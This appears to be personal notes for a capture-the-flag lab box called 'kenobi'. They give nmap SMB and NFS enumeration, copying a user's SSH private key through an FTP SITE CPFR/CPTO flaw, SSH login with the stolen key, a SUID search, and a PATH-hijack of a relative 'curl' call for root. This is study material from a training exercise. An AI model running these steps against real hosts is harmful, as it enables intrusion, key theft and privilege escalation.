#samba #smb #searchsploit #scp 


**General steps:**
```
Enumerate: Checkout services, check open samba shares, check existing ssh users, check ftp services, check points of mounting, check for exploit for the services versions.

Exploit: Use the ftp exploit to move the ssh id key of the kenobi user into a mountable and writeable folder.

PrivEsc: We have the ssh login of kenobi, now we need to privesc. Find a odd file with SUID bit, check how it works and what commands it runs. Exploit that it does not use absolute paths when calling curl, make our own "curl file" which get execute insted and opens a root shell.
```



```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.79.202
```

```
└─$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.79.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 06:53 EST
Nmap scan report for 10.10.79.202
Host is up (0.044s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.79.202\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.79.202\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.79.202\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```


**enumerate rpcbind**
```
└─$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.79.202
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:03 EST
Nmap scan report for 10.10.79.202
Host is up (0.051s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

```

- We can mount to /var directory. 

**Check for exploits on the ftp service**
![[Pasted image 20250208130606.png]]

![[Pasted image 20250208131554.png]]



- We found the location of the kenobi secret key from the samba log, and we move it to a folder we can mount to remotely and have write permissions to. 
- The commands we use SITE CPFR, SITE CPTO 


![[Pasted image 20250208131112.png]]
- OPS, did not mean to call the fill ip_rsa 


- Q: do we need to mount from /mnt ? 
```
sudo mount 10.10.79.202:/var /mnt/kenobiNFS
```

- Here we get the id_rsa, private key for kenobi ssh login, which we moved to /var earlier 
- Then we can use it to access the ssh server:
```
ssh -i id_rsa kenobi@10.10.79.202
```


- we browse some files, and find a file we want to download. We can do this with scp from our local machine:
```
scp -i id_rsa kenobi@10.10.79.202:/home/kenobi/user.txt .
```

- We got the user.txt, now lets get root.


**PrivEsc:**



- Start by checking commands which has the SUID-bit:
```
kenobi@kenobi:~$ find / -type f -perm -04000 -ls 2>/dev/null
   279750     96 -rwsr-xr-x   1 root     root        94240 May  8  2019 /sbin/mount.nfs
   277766     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   276573     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   277903    100 -rwsr-sr-x   1 root     root          98440 Jan 29  2019 /usr/lib/snapd/snap-confine
   260788     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   276950    420 -rwsr-xr-x   1 root     root         428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
   275955     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
   260462     52 -rwsr-xr-x   1 root     root          49584 May 16  2017 /usr/bin/chfn
   275975     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newgidmap
   277767     24 -rwsr-xr-x   1 root     root          23376 Jan 15  2019 /usr/bin/pkexec
   260602     56 -rwsr-xr-x   1 root     root          54256 May 16  2017 /usr/bin/passwd
   275974     36 -rwsr-xr-x   1 root     root          32944 May 16  2017 /usr/bin/newuidmap
   260525     76 -rwsr-xr-x   1 root     root          75304 May 16  2017 /usr/bin/gpasswd
   280011     12 -rwsr-xr-x   1 root     root           8880 Sep  4  2019 /usr/bin/menu
   260686    136 -rwsr-xr-x   1 root     root         136808 Jul  4  2017 /usr/bin/sudo
   260464     40 -rwsr-xr-x   1 root     root          40432 May 16  2017 /usr/bin/chsh
   277159     52 -rwsr-sr-x   1 daemon   daemon        51464 Jan 14  2016 /usr/bin/at
   260591     40 -rwsr-xr-x   1 root     root          39904 May 16  2017 /usr/bin/newgrp
   260206     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
   276584     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
   260157     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
   260171     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
   260188     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
   260172     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
```


CLEANER way to view the SUID bit file:

```
find / -perm -u=s -type f 2>/dev/null
```

- A file which look off is the /usr/bin/menu file, we try to run it:
![[Pasted image 20250208135613.png]]

- Investegating the binary with string, we can see:
![[Pasted image 20250208140047.png]]
- It do not uses absolute paths for the commands curl or uname (not using /usr/bin/curl). 
- So we can make our own file named curl, which contain a shell, and the menu binary will run this instead of the actual curl command. 
![[Pasted image 20250208140428.png]]

